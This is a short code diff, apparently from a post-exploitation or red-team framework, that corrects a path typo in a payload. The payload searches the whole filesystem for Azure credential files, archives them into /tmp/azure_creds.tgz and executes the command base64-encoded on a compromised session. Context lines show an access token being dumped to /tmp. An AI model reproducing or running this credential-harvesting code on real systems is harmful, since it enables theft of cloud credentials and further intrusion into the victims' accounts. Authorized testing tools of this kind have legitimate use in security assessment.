@@ -200,7 +200,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                     session.log(result)
 
                     # create an archive of all azure creds
-                    payload = 'tar -czvf /tmp/azure_creds.tgz -C / $(find / \( -type f -a \( -name \'my.azureauth\' -a -path \'*.azyre/my.azureauth\' \) \)  -printf \'%P\n\')'
+                    payload = 'tar -czvf /tmp/azure_creds.tgz -C / $(find / \( -type f -a \( -name \'my.azureauth\' -a -path \'*.azure/my.azureauth\' \) \)  -printf \'%P\n\')'
                     session.log("payload loaded and ready")
                     result = run_base64_payload(
                         session=session, payload=payload, log_name="payload_azurecreds")
